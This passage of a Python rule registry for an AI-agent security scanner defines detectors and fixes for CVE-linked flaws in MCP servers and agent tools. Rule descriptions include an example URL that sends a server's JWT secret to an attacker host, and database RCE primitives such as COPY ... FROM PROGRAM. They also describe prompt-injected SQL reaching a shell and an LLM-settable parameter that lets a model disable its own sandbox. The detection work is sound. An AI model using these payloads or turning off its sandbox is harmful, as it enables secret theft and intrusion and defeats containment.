    "plus a strict symbol allow-list for math. Validate input "
    "length + char-set before evaluation. The `mcp-calculate-server` "
    "0.1.1 fix is one canonical example of the safer shape.",
    sarif_name="McpToolUnsafeEvalSourceShape",
    cve_references=["CVE-2026-44717"],
    owasp_mcp_references=["MCP01:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI05"],
    incident_references=["NVD-CVE-2026-44717"],
)

_r(
    "AAK-MCP-OPENAPI-LAZY-DESCRIPTION-001",
    "OpenAPI operation with missing or sub-40-char description (Hermes LAZY)",
    "An OpenAPI 3.x operation has a missing or sub-40-character "
    "`description` field. Per Hermes (arXiv:2605.14312, EASE 2026), "
    "this is the most common smell in MCP-on-REST migrations — "
    "agents over-rely on operation descriptions to disambiguate "
    "tool choice, and sparse descriptions cause silent mis-routing. "
    "Hermes' large-scale evaluation found this smell across "
    "essentially every analyzed operation in the 600-endpoint "
    "corpus, with 2,450 smells total across the 3 classes "
    "(LAZY / BLOATED / TANGLED).",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Author a >=40-character description that names the operation's "
    "purpose, expected input shape, and side-effecting class. "
    "Agent tool-selection accuracy improves materially when "
    "descriptions disambiguate similar-looking operations.",
    sarif_name="OpenApiLazyDescription",
    incident_references=["ARXIV-2605.14312"],
)

_r(
    "AAK-MCP-OPENAPI-BLOATED-PARAMS-001",
    "OpenAPI operation with >12 parameters or >24 request-body properties (Hermes BLOATED)",
    "An OpenAPI 3.x operation declares more than 12 `parameters` "
    "or more than 24 `requestBody` schema properties. Per Hermes "
    "(arXiv:2605.14312), bloated operations exceed the working-"
    "memory budget of mainstream LLM tool-callers (typical "
    "context budget per tool: 8-12 fields) and cause partial-"
    "argument hallucination or skipped operations. Affects MCP "
    "servers that auto-generate tools from a CRUD REST API.",
    Severity.LOW,
    Category.TOOL_POISONING,
    "Decompose the operation into smaller MCP tools, each owning "
    "<=12 parameters, OR split the request body into nested "
    "sub-operations. If the breadth is required, expose a "
    "structured-output schema that the agent can consult before "
    "the call.",
    sarif_name="OpenApiBloatedParameters",
    incident_references=["ARXIV-2605.14312"],
)

_r(
    "AAK-MCP-OPENAPI-TANGLED-METHODS-001",
    "OpenAPI path serving >4 HTTP methods or method-name/path semantic contradiction (Hermes TANGLED)",
    "An OpenAPI 3.x path operates as >4 HTTP methods (e.g. GET + "
    "POST + PUT + PATCH + DELETE all on the same path), OR the "
    "HTTP method contradicts the path segment (e.g. POST /get/... "
    "or GET /create/...). Per Hermes (arXiv:2605.14312), tangled "
    "path-and-method semantics confuse agents that infer operation "
    "intent from the path string. Side-effect-misclassification "
    "is the realized failure mode.",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Split the tangled path into >=2 disjoint paths, each owning "
    "<=4 methods with method-name and path-segment in semantic "
    "agreement. Reserve verbs (`/get/...`, `/create/...`) for "
    "their corresponding HTTP methods only.",
    sarif_name="OpenApiTangledMethodsAndPaths",
    incident_references=["ARXIV-2605.14312"],
)

_r(
    "AAK-MCPCALC-CVE-2026-44717-PIN-001",
    "MCP Calculate Server eval() RCE (CVE-2026-44717, PyPI <0.1.1)",
    "The PyPI package `mcp-calculate-server` <0.1.1 has a remote code "
    "execution vulnerability in its MCP tool handler — the math "
    "expression is routed through `eval()` (SymPy-backed without "
    "`local_dict` / `global_dict` namespace pinning), so an attacker "
    "controlling the tool input reaches host RCE. CVE-2026-44717 "
    "(CVSS 9.8 CRITICAL, NVD 2026-05-15). Patched in 0.1.1 (latest "
    "at AAK ship time: 1.0.0). This pin-only rule fires on the "
    "package in any Python manifest (`requirements*.txt`, "
    "`pyproject.toml`, `Pipfile*`, `poetry.lock`, `uv.lock`). A "
    "broader source-detector for the unsafe-`eval()` shape inside "
    "any `@tool` / `@mcp.tool()` decorated handler is queued for "
    "v0.3.19+ — it would catch single-author MCP servers with the "
    "same shape, not just this product.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Bump `mcp-calculate-server` to >= 0.1.1 (or the latest 1.x). "
    "If you maintain a similar MCP server, replace `eval()` with "
    "`ast.literal_eval` for plain numerics, or SymPy "
    "`parse_expr(expr, local_dict={}, global_dict={}, evaluate=True)` "
    "with explicit allow-listed symbol tables.",
    sarif_name="McpCalculateServerEvalRce",
    cve_references=["CVE-2026-44717"],
    owasp_mcp_references=["MCP01:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI05"],
    incident_references=["NVD-CVE-2026-44717"],
)

_r(
    "AAK-SK-INMEMORY-VECTORSTORE-FILTER-CVE-2026-26030-PIN-001",
    "Microsoft Semantic Kernel InMemoryVectorStore filter RCE (CVE-2026-26030, PyPI <1.39.4)",
    "Microsoft Semantic Kernel Python SDK <1.39.4 has a remote code "
    "execution vulnerability in the `InMemoryVectorStore` filter "
    "functionality — CVE-2026-26030 (CVSS 9.9 CRITICAL). Patched in "
    "`python-1.39.4`. This pin-only rule fires on the PyPI package "
    "`semantic-kernel` < 1.39.4 in any Python manifest "
    "(`requirements*.txt` / `pyproject.toml` / `Pipfile*` / "
    "`poetry.lock` / `uv.lock`). A companion .NET-side disclosure "
    "(file-write in SessionsPythonPlugin, patched in the .NET 1.71.0 "
    "release) is intentionally **out of scope** — AAK does not "
    "currently scan NuGet manifests; only the Python pin shape is "
    "actionable here. Disclosed by MSRC on 2026-05-07.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Bump `semantic-kernel` to >= 1.39.4 in any Python manifest "
    "pinning Semantic Kernel. The rule fires only on the pin shape; "
    "a source detector for unsafe `InMemoryVectorStore(filter=...)` "
    "constructions is queued for v0.3.18 once the upstream filter "
    "API surface stabilises post-patch.",
    sarif_name="SemanticKernelInMemoryVectorStoreFilterRce",
    cve_references=["CVE-2026-26030"],
    owasp_agentic_references=["ASI02", "ASI05", "ASI10"],
    incident_references=["MSRC-2026-05-07"],
)

_r(
    "AAK-CLAUDECODE-CVE-2026-40068-PIN-001",
    "Anthropic Claude Code folder-trust bypass (CVE-2026-40068, npm <2.1.83)",
    "Claude Code 2.1.63 → before 2.1.83 derives folder-trust from the "
    "git worktree `commondir` file without validating its contents. A "
    "malicious repo with a crafted `commondir` pointing to a previously-"
    "trusted path silently bypasses the trust prompt — every subsequent "
    "agent run executes inside that fake-trusted scope. Patched in "
    "2.1.83 (released 2026-05-04). This pin-only rule fires on the "
    "scoped npm package `@anthropic-ai/claude-code` < 2.1.83 in any "
    "consumer manifest. Pre-allocated rule-name from the v0.3.15 "
    "triage of issue #181; ships in v0.3.16.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Bump `@anthropic-ai/claude-code` to >=2.1.83 in any npm "
    "manifest pinning Claude Code. The rule fires only on the pin "
    "shape; runtime detection of crafted commondir attacks against "
    "an unpinned global install is out of scope (vendor's prompt "
    "fix is the right fix once 2.1.83+ is installed).",
    sarif_name="ClaudeCodeFolderTrustBypass",
    cve_references=["CVE-2026-40068"],
    owasp_agentic_references=["ASI03", "ASI10"],
    incident_references=["ANTHROPIC-CLAUDECODE-2026-05-06"],
)

_r(
    "AAK-GPTRESEARCHER-MCP-STDIO-MITM-001",
    "GPT-Researcher MCP transport-flip MITM (OX 2026-05-01, CVE-2025-65720)",
    "Phase 2 sibling of AAK-DOCSGPT-MCP-STDIO-MITM-001 (v0.3.14). "
    "Two-arm detector for assafelovic/gpt-researcher under the OX MCP "
    "2026-05-01 disclosure batch. Arm 1 — pin-check on the PyPI "
    "`gpt-researcher` / `gpt-researcher-mcp` packages (primary surface), "
    "plus npm + GitHub `assafelovic/gpt-researcher` git refs. Latest "
    "PyPI release is 0.14.8 (2026-03-13), pre-disclosure — vendor has "
    "not shipped a post-disclosure fix as of the AAK ship date, so the "
    "rule fires for any pinned version (same `patched_in: None` posture "
    "as astro-mcp / chatgpt-mcp). Arm 2 — server-config scanner "
    "`gpt_researcher_transport_flip.py` that fires when a "
    "GPT-Researcher-named MCP config declares an SSE/HTTP transport but "
    "permits a post-handshake `transport=stdio` override (the MITM "
    "transport-flip path). Configs that explicitly set "
    "`deny_stdio_transport: true` or `allowed_transports: [\"sse\"]` "
    "short-circuit the rule. Architectural receiver-side class is "
    "covered by AAK-MCP-STDIO-CMD-INJ-001 (Python).",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin `gpt-researcher` away from any pre-disclosure version when "
    "vendor ships a post-2026-05-01 fix (track at "
    "https://github.com/assafelovic/gpt-researcher). For the "
    "server-config arm, set `\"deny_stdio_transport\": true` (or "
    "`\"allowed_transports\": [\"sse\"]`) to prevent MITM transport-flip "
    "into the stdio cmd-injection class.",
    sarif_name="GptResearcherMcpTransportFlip",
    cve_references=["CVE-2025-65720"],
    owasp_mcp_references=["MCP01:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI10"],
    incident_references=["OX-MCP-2026-05-01"],
)

_r(
    "AAK-DOCSGPT-MCP-STDIO-MITM-001",
    "DocsGPT MCP transport-flip MITM (OX 2026-05-01, CVE-2026-26015 family)",
    "Two-arm detector for the OX MCP 2026-05-01 disclosure batch. "
    "Arm 1 — pin-check on the npm `docsgpt` / `docsgpt-mcp` package, "
    "GitHub `arc53/DocsGPT` git refs in package.json / lockfiles, and "
    "the same package in `pyproject.toml` / `requirements*.txt`. Fires "
    "for any pin below the patched 0.6.4 floor. Arm 2 — server-config "
    "scanner that fires when a DocsGPT MCP config declares a safe "
    "transport (`sse` / `http` / `https`) but permits a post-handshake "
    "`transport=stdio` override (the MITM transport-flip path the "
    "disclosure traced through CVE-2026-26015). The architectural "
    "receiver-side class is already covered by AAK-MCP-STDIO-CMD-INJ-"
    "001/002/003/004 + AAK-STDIO-001 (shipped v0.3.6); this rule adds "
    "the product-named pin row consumers expect when grepping "
    "CHANGELOG.cves.md for 'DocsGPT' plus the transport-flip-resistance "
    "check the receiver-side rules don't catch.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin DocsGPT >=0.6.4 (vendor fix from the OX 2026-05-01 batch). For "
    "the server-config arm, set `\"deny_stdio_transport\": true` (or "
    "`\"allowed_transports\": [\"sse\"]`) so a MITM cannot flip the "
    "transport mid-session. The receiver-side class detectors "
    "(AAK-MCP-STDIO-CMD-INJ-*) catch the downstream cmd-injection if "
    "the flip succeeds; this rule prevents the flip in the first place.",
    sarif_name="DocsGptMcpTransportFlip",
    cve_references=["CVE-2026-26015"],
    owasp_mcp_references=["MCP01:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI10"],
    incident_references=["OX-MCP-2026-05-01"],
)

_r(
    "AAK-CHATGPT-MCP-CVE-2026-7061-PIN-001",
    "chatgpt-mcp-server OS command injection (CVE-2026-7061, npm/git <=0.1.0)",
    "Toowiredd/chatgpt-mcp-server <=0.1.0 has an OS command injection "
    "in `src/services/docker.service.ts` (the MCP/HTTP path). "
    "CVE-2026-7061 (NVD, CVSS 7.3): the package is NOT published to "
    "npm — consumers install via a `git+https://` URL or GitHub "
    "shorthand in package.json. No upstream patch as of the AAK ship "
    "date; every version <=0.1.0 is vulnerable. The architectural "
    "class is also caught by AAK-MCP-STDIO-CMD-INJ-002 (TS-side "
    "stdio cmd-injection taint sink); this pin-only rule is the "
    "named-CVE companion that surfaces a discrete finding for "
    "consumers running pin-check mode and want an actionable "
    "manifest fix.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin away from chatgpt-mcp-server until an upstream patch ships "
    "(track at https://github.com/Toowiredd/chatgpt-mcp-server). For "
    "the runtime shape, AAK-MCP-STDIO-CMD-INJ-002 already fires on "
    "any TS file that constructs a stdio command from network input.",
    sarif_name="ChatGptMcpCmdInjection",
    cve_references=["CVE-2026-7061"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI02", "ASI10"],
    incident_references=["NVD-CVE-2026-7061"],
)

_r(
    "AAK-LITELLM-CVE-2026-30623-PIN-001",
    "LiteLLM pin floor for CVE-2026-30623 (<1.83.7)",
    "A Python manifest (`requirements*.txt`, `pyproject.toml`, "
    "`Pipfile*`, `poetry.lock`, `uv.lock`) pins `litellm` at a "
    "version below 1.83.7. BerriAI/litellm shipped the CVE-2026-30623 "
    "fix in v1.83.7 on 2026-04-30. AAK-MCP-STDIO-CMD-INJ-001 already "
    "covers the source-side architectural shape; this pin-only rule "
    "complements it by surfacing a discrete finding for consumers "
    "who run pin-check mode and need an actionable manifest fix. "
    "The <1.83.7 floor also flags the LiteLLM MCP-proxy CVE cluster, all "
    "in versions below the floor: CVE-2026-12773 (improper authentication "
    "in the MCP proxy `UserAPIKeyAuth`, <=1.59.8), CVE-2026-12774 (SSRF in "
    "MCP server connection testing, <=1.82.2), and CVE-2026-12798 (SSRF in "
    "the MCP OpenAPI spec loader, <=1.82.2). "
    "Wired into `aak fix --cve` so the auto-fixer can rewrite "
    "requirements*.txt entries to `litellm>=1.83.7`.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Bump `litellm` to >= 1.83.7. `aak fix --cve` rewrites a "
    "requirements*.txt pin in place; `pyproject.toml` / lockfile "
    "edits should go through the project's normal dependency-update "
    "workflow.",
    sarif_name="LitellmCveStaleVersion",
    cve_references=[
        "CVE-2026-30623", "CVE-2026-12773", "CVE-2026-12774", "CVE-2026-12798",
    ],
    owasp_mcp_references=["MCP01:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI10"],
    incident_references=["BERRIAI-LITELLM-2026-04-30"],
    auto_fixable=True,
)

_r(
    "AAK-OPENCLAW-PRIVESC-001",
    "OpenClaw agent role missing or attacker-influenced",
    "`OpenClawAgent(role=...)` is unset, None, or sourced from "
    "untrusted input without `assert_role_allowlisted(role)`. "
    "IronPlate's 2026-04-07 weekly intel flagged a CVSS 9.9 "
    "privilege-escalation in OpenClaw where a missing/forgable role "
    "default lets a prompt-borne agent escalate to admin actions. "
    "Provisional rule pending a public CVE assignment.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Always pass an explicit, allow-listed role to OpenClawAgent. "
    "Wrap the assignment with `aak.checks.openclaw."
    "assert_role_allowlisted(role)`. Pin the OpenClaw version once "
    "the upstream patch ships; the AAK rule will auto-promote from "
    "`provisional` to `confirmed` when "
    "`scripts/refresh_openclaw_status.py` finds a CVE ID.",
    sarif_name="OpenClawPrivesc",
    owasp_agentic_references=["ASI03"],
    incident_references=["IRONPLATE-2026-04-07"],
)

_r(
    "AAK-MCP-SANDBOX-SELFDISABLE-001",
    "Tool schema exposes an LLM-settable sandbox/isolation-disable parameter",
    "A tool/function JSON schema or MCP tool descriptor declares a parameter "
    "whose name disables or weakens sandboxing/isolation (e.g. "
    "`dangerouslyDisableSandbox`, `disable_sandbox`, `no_sandbox`, "
    "`allow_unsafe`, `skip_isolation`) inside the schema's `properties` — "
    "meaning the LLM, an untrusted principal, can set it in any tool_use "
    "response and turn off the very sandbox that contains tool execution. "
    "This is the CVE-2026-42074 class (OpenClaude < 0.5.1 exposed "
    "`dangerouslyDisableSandbox` in the BashTool input schema; CWE-284 / "
    "CWE-306, CVSS 9.8). A parameter that is genuinely operator-only must "
    "not live in the model-facing input schema; mark it `readOnly: true` or "
    "annotate it `\"x-aak-sandbox-control\": \"ops-only\"` (or "
    "`\"x-llm-settable\": false`) to assert it is set server-side, which "
    "suppresses this finding.",
    Severity.CRITICAL,
    Category.TRUST_BOUNDARY,
    "Remove the sandbox/isolation-disable parameter from the model-facing "
    "tool input schema entirely. If a privileged escape hatch is required, "
    "gate it server-side behind an operator credential — never let it be "
    "populated from a tool_use argument. If the flag is legitimately set "
    "only by the host (never the model), mark the property `readOnly: true` "
    "or annotate it `\"x-aak-sandbox-control\": \"ops-only\"` to document "
    "that it is not LLM-settable.",
    sarif_name="ToolSchemaSandboxSelfDisable",
    cve_references=["CVE-2026-42074"],
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI06", "ASI04"],
)

_r(
    "AAK-AGENT-SHARED-RES-AUTHZ-001",
    "Mutating tool on a shared/multi-agent resource lacks a per-actor "
    "authorization parameter",
    "A tool/function/MCP descriptor exposes a mutating operation "
    "(delete / remove / edit / update / overwrite / move) on a file, record, "
    "or resource that is reachable in a shared or multi-agent context, yet its "
    "input schema carries no owner / actor / authorization / permission field. "
    "Any agent that can call the tool can therefore mutate another principal's "
    "resource — there is nothing in the call surface that scopes the action to "
    "the caller. This is the CVE-2026-44654 broken-access-control class "
    "(LibreChat <= 0.8.3: a shared-agent editor could delete file records via "
    "`DELETE /api/files` that the owner had reused across multiple agents; "
    "CWE-863 Incorrect Authorization, CVSS 8.1). The shared context is "
    "inferred from a multi-agent config (an `agents` collection with >1 "
    "member, or a `shared` / `scope: shared|workspace|team` marker) or from "
    "shared-resource language in the tool's own name/description.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Add and enforce a per-actor authorization parameter (e.g. `owner_id`, "
    "`actor`, `on_behalf_of`, `authorization`) and check it server-side so a "
    "tool call can only mutate resources the calling principal owns. Do not "
    "rely on the agent to self-restrict. If the resource is genuinely global "
    "and every agent is authorized to mutate it, annotate the tool "
    "`\"x-aak-shared-authz\": \"global-ok\"` to document the decision and "
    "suppress this finding.",
    sarif_name="SharedResourceMissingActorAuthz",
    cve_references=["CVE-2026-44654"],
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI04", "ASI02"],
)

_r(
    "AAK-MCP-STDIO-LAUNCHER-INJECT-001",
    "MCP stdio server launches a shell-style interpreter with an exec flag "
    "or interpolated args",
    "An MCP stdio server definition (`command` + `args` in a `.mcp.json` / "
    "`mcpServers` block) launches a shell-style interpreter "
    "(`npx`, `node`, `bash`, `sh`, `python`) with a code-execution flag "
    "(`-c`, `-e`, `--eval`), or passes an arg carrying a template / "
    "interpolation token (`${...}` embedded in a larger string, `{{...}}`, "
    "`%s`) that is not a pinned static literal. Either shape turns the "
    "launched process into an arbitrary-code sink the moment the value is "
    "attacker- or model-influenced. This is the CVE-2026-40933 class "
    "(Flowise < 3.1.0 unsafely serialised stdio commands in its MCP adapter "
    "— an authenticated actor could register an stdio server whose "
    "allowlisted launcher, e.g. `npx`, was combined with `-c` to run "
    "arbitrary OS commands; CWE-78, CVSS 9.9). Distinct from AAK-MCP-002 "
    "(which inspects only the `command` string for `sh -c`/`bash -c` "
    "wrappers and shell metacharacters, never `args`) and from the "
    "source-code taint rules AAK-MCP-STDIO-CMD-INJ-001..004 (which model "
    "`StdioServerParameters(command=tainted)` in Python/TS/Java/Rust). A "
    "standalone env reference (`${VAR}`) is treated as pinned and does not "
    "fire.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Do not launch interpreters with `-c`/`-e`/`--eval` from an MCP stdio "
    "definition. Pin `command` to a concrete server executable and pass only "
    "static, literal `args` (e.g. `[\"--port\", \"8080\"]`). If a value must "
    "vary, use a standalone env reference (`${VAR}`) resolved by the host — "
    "never interpolate model- or request-derived strings into the argv. "
    "Enforce a strict argv allowlist server-side. See AAK-MCP-002 and "
    "AAK-FLOWISE-001 for related angles on the same RCE class.",
    sarif_name="McpStdioLauncherInjection",
    cve_references=["CVE-2026-40933"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05", "ASI02"],
    adversa_references=["ADV-INJECT-01"],
)

_r(
    "AAK-MCP-TOOLGATE-ASYMMETRY-001",
    "MCP tool gate enforced in tools/list but not tools/call",
    "An MCP server gates tools by an allowlist / read-only / "
    "non-destructive control (e.g. `ALLOWED_TOOLS`, "
    "`ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS`, a `*READONLY*` / "
    "`*NON_DESTRUCTIVE*` env var or config) and applies that check in the "
    "tool-discovery handler (`tools/list` / `list_tools` / "
    "`ListToolsRequestSchema`) but NOT in the execution handler "
    "(`tools/call` / `call_tool` / `CallToolRequestSchema`). A client that "
    "skips discovery and calls a hidden tool name directly bypasses the "
    "control entirely — the gate is cosmetic. This is the CVE-2026-46519 "
    "class (mcp-server-kubernetes < 3.6.0 documented three env vars as "
    "access controls but enforced them only at the discovery layer; "
    "CWE-863 Incorrect Authorization, CVSS 8.8). This is an "
    "enforcement-layer asymmetry — distinct from AAK-MCPWN-001, which is a "
    "transport-middleware route asymmetry (`/mcp_message` vs `/mcp`). Do "
    "not conflate the two.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Enforce the same allowlist / read-only / non-destructive check inside "
    "the `tools/call` (execution) handler, not only in `tools/list` "
    "(discovery). Authorization must gate the action, not just its "
    "visibility — a denied tool must raise in the call path even when the "
    "client never listed it. Centralise the check (e.g. a shared "
    "`assert_tool_allowed(name)` called at the top of the call handler) so "
    "discovery and execution cannot drift apart.",
    sarif_name="McpToolGateAsymmetry",
    cve_references=["CVE-2026-46519"],
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI04", "ASI02"],
)

_r(
    "AAK-MCP-ENV-PLACEHOLDER-EXFIL-001",
    "MCP server resolves ${VAR} placeholders against process.env on a "
    "user-supplied server config (secret exfiltration)",
    "An MCP server resolves `${VAR}` / `$VAR` placeholders against its own "
    "process environment (`process.env` in Node, `os.environ` / "
    "`os.path.expandvars` in Python) while parsing or validating a "
    "user-supplied MCP server config — typically the server URL. An "
    "authenticated user can then submit a URL like "
    "`https://attacker.example/?k=${JWT_SECRET}` and the server "
    "interpolates its own secrets into the outbound request, exfiltrating "
    "them to an attacker-controlled host. This is the CVE-2026-32625 class "
    "(LibreChat <= 0.8.3 resolved `${VAR}` against `process.env` during Zod "
    "validation of user-supplied MCP server URLs, leaking `CREDS_KEY`, "
    "`JWT_SECRET`, `MONGO_URI`, etc.; CWE-200, CVSS 9.6). Detected as a "
    "`${...}`-placeholder resolver that reads the process environment "
    "(`.replace(/.../, ... process.env ...)`, `os.path.expandvars(...)`, "
    "`.format(**os.environ)`) inside an MCP-server config/URL path.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Never expand environment placeholders found inside a user-supplied "
    "value. Treat the MCP server URL/config as untrusted data: reject or "
    "percent-encode `${...}` sequences, and resolve env references only "
    "from a server-side allowlist of config keys that are known-safe to "
    "echo — never the full `process.env` / `os.environ`. Validate the "
    "resolved URL host against an allowlist before connecting.",
    sarif_name="McpEnvPlaceholderExfil",
    cve_references=["CVE-2026-32625"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
)

_r(
    "AAK-MCP-HTTP-NOAUTH-SERVER-001",
    "Published MCP HTTP/SSE server exposes an unauthenticated network-bound "
    "endpoint",
    "A repository publishes an MCP server over HTTP / SSE / Streamable-HTTP "
    "(an `/mcp` route handler, or an `SSEServerTransport` / "
    "`StreamableHTTPServerTransport` / `--http` setup) with no inbound "
    "authentication marker on the handler, while also binding to all "
    "interfaces (`0.0.0.0` / `::`) or serving a wildcard "
    "`Access-Control-Allow-Origin: *`. The result is a mutation-capable RPC "
    "endpoint, backed by the operator's own tokens, reachable without "
    "credentials by any network (or, with wildcard CORS, any cross-origin "
    "browser) peer. This is a recurring 2026 class: GitLab MCP Server "
    "(CVE-2026-44895), Nocturne Memory (CVE-2026-44830), and AgenticMail "
    "(CVE-2026-50287) all shipped auth-less HTTP/SSE MCP transports on "
    "`0.0.0.0` with wildcard CORS. Generalises the Azure-only "
    "`AAK-AZURE-MCP-NOAUTH-001` to any published MCP HTTP server (the Azure "
    "rule still owns Azure-MCP repos; this rule defers to it there). "
    "Beyond server source, this also flags the launch surface: MCP config "
    "files (`mcp.json`, `claude_desktop_config.json`, `*.mcp.yaml` "
    "`command`/`args`), Docker `--host 0.0.0.0` / `-p 0.0.0.0:` publishes, "
    "and MCP Inspector / FastMCP startup args that bind a non-loopback "
    "interface (`0.0.0.0` / `::` / a routable IP) with no token / "
    "`requireAuth`, or with the Inspector kill-switch `DANGEROUSLY_OMIT_AUTH` "
    "set. CVE-2026-23744 (MCP Inspector, CVSS 9.8) is the motivating exemplar "
    "of the launch-bind variant; Censys counted ~12,520 MCP services exposed "
    "on the public internet in this shape. Two further 2026 instances of this "
    "exact class: CVE-2026-49257 (mcp-pinot <= 3.0.1, CVSS 10.0) defaults to "
    "an HTTP MCP server bound to `0.0.0.0:8080` with no authentication, "
    "exposing SQL execution as a confused deputy; CVE-2026-48989 (Windows-MCP "
    "< 0.7.5, CVSS 8.9) exposed the MCP control plane over HTTP without auth "
    "while enabling wildcard CORS. CWE-306 (Missing Authentication for "
    "Critical Function).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Require an inbound credential on every `/mcp` route / SSE handler "
    "(bearer/JWT/mTLS/API-key middleware) and fail closed when the "
    "credential is unset — never bypass auth when an `API_TOKEN` env var is "
    "empty. Bind the listener to `127.0.0.1` (or behind an authenticating "
    "reverse proxy) instead of `0.0.0.0`, never pass `--host 0.0.0.0` to the "
    "MCP Inspector / FastMCP without a token, never set "
    "`DANGEROUSLY_OMIT_AUTH`, and replace wildcard CORS with an explicit "
    "origin allowlist (see AAK's wildcard-CORS rule).",
    sarif_name="McpHttpServerNoAuth",
    cve_references=[
        "CVE-2026-44895", "CVE-2026-44830", "CVE-2026-50287", "CVE-2026-23744",
        "CVE-2026-49257", "CVE-2026-48989",
    ],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
)

_r(
    "AAK-LLM-SQL-RCE-001",
    "LLM-generated SQL executed on an RCE-capable database role",
    "An agent / LLM application feeds model-generated SQL into a database "
    "executor whose connection role holds code-execution or filesystem "
    "privileges, turning prompt-injected SQL into remote code execution. Two "
    "arms fire this rule: (a) an LLM-output value reaches a SQL-execution sink "
    "(`cursor.execute` / `conn.execute` / SQLAlchemy `text(...)` / a TS "
    "`.query()`/`.raw()` call) as the query itself — not as a bound "
    "parameter — with no allow-list or query-validation step; and (b) a DB "
    "connection string / role that grants the dangerous primitives (a "
    "superuser connection account, or a literal PostgreSQL "
    "`COPY ... FROM PROGRAM` / `pg_execute_server_program`, MySQL `FILE` / "
    "`INTO OUTFILE` / `LOAD_FILE`, or MS SQL `xp_cmdshell`) inside an "
    "LLM/agent context. CVE-2026-25879 is the documented instance: a "
    "text-to-SQL chat agent ran model output on a superuser connection and a "
    "prompt-injected `COPY ... FROM PROGRAM` produced a shell. CWE-94 (Code "
    "Injection) / CWE-89 (SQL Injection) chained to CWE-78 (OS Command "
    "Injection) through CWE-250 (Execution with Unnecessary Privileges). This "
    "is distinct from `AAK-TAINT-005`, where the tainted source is a tool "
    "*parameter* string-formatted into SQL rather than LLM output landing on "
    "an RCE-capable role.",
    Severity.CRITICAL,
    Category.TAINT_ANALYSIS,
    "Never execute LLM-generated SQL directly. Constrain the model to "
    "parameterised, allow-listed queries (validate with `sqlglot`/`sqlparse` "
    "and reject anything that is not a single read-only `SELECT` against an "
    "approved table set), and run every agent query on a dedicated "
    "least-privilege, read-only role that lacks `pg_execute_server_program` / "
    "`FILE` / `xp_cmdshell` and cannot `COPY ... FROM PROGRAM`. Treat the DB "
    "role as the last line of defence: even a perfect prompt filter must not "
    "sit in front of a superuser connection.",
    sarif_name="LlmSqlRce",
    cve_references=["CVE-2026-25879"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI02", "ASI05"],
    adversa_references=["ADV-INJECT-07"],
)

_r(
    "AAK-SKILL-UNTRUSTED-EXEC-PATH",
    "Untrusted-search-path executable override in skill/install flow",
    "Install or skill-setup code resolves an executable, interpreter, or build "
    "tool from a workspace-controlled source and runs it without an "
    "absolute-path pin or allowlist, so the workspace decides which binary "
    "executes. Detected sources: a `.env` / dotenv-sourced variable "
    "(`load_dotenv()` then `os.environ.get(...)` / `os.getenv(...)` / "
    "`dotenv_values(...)`), a `PATH` prepended with a non-absolute / workspace "
    "directory (`os.environ['PATH'] = os.getcwd() + os.pathsep + ...`), "
    "`shutil.which(...)` resolved over such a tainted `PATH`, or a Homebrew / "
    "package-manager binary chosen via an env override (`HOMEBREW_*` / `BREW`). "
    "Anchor: CVE-2026-53819 (CWE-426 Untrusted Search Path, CVSS 8.7) — "
    "OpenClaw before 2026.5.27 let a workspace `.env` override the Homebrew "
    "executable selection during skill install, executing unintended "
    "Homebrew-compatible binaries to compromise the system. This is an "
    "install-time code-execution sink, distinct from `AAK-CLAUDE-WIN-001` (a "
    "Windows ProgramData config-path hijack) and from the `AAK-SKILL-001..005` "
    "SKILL.md content checks.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin the executable to an absolute path; do not resolve build tools from "
    "workspace-controlled env. Hard-code the trusted binary location (e.g. "
    "`/opt/homebrew/bin/brew`) or validate the resolved path against an "
    "allowlist with `os.path.isabs` before exec, and never let a workspace "
    "`.env` or a workspace-relative `PATH` prepend select the interpreter / "
    "build tool used during skill setup.",
    sarif_name="SkillUntrustedExecPath",
    cve_references=["CVE-2026-53819"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-PATH-01"],
)

_r(
    "AAK-MCP-ARGV-TOCTOU-001",
    "Argv re-built after allowlist approval before spawn (command-injection TOCTOU)",
    "A command / argv buffer is approved against an allow/deny list and then "
    "reassigned, re-split (`shlex.split` / `.split()`), re-joined, "
    "concatenated, `.extend()`/`.push()`-ed, or otherwise rebuilt before it is "
    "passed to a process-spawn sink (`subprocess.run`/`Popen`/`call`, "
    "`os.exec*` / `os.system`; Node `child_process.spawn`/`exec`/`execFile`, "
    "`execa`) — with no re-validation between the mutation and the spawn. The "
    "executed command shape therefore differs from the one that was approved, "
    "so an attacker-controlled argv can pass the allowlist check and still "
    "reach the shell. Anchor: CVE-2026-53822 (CVSS 8.8) — OpenClaw before "
    "2026.5.18 contained a command injection where the shell wrapper argv "
    "could change between approval and execution. CWE-77 (Command Injection) "
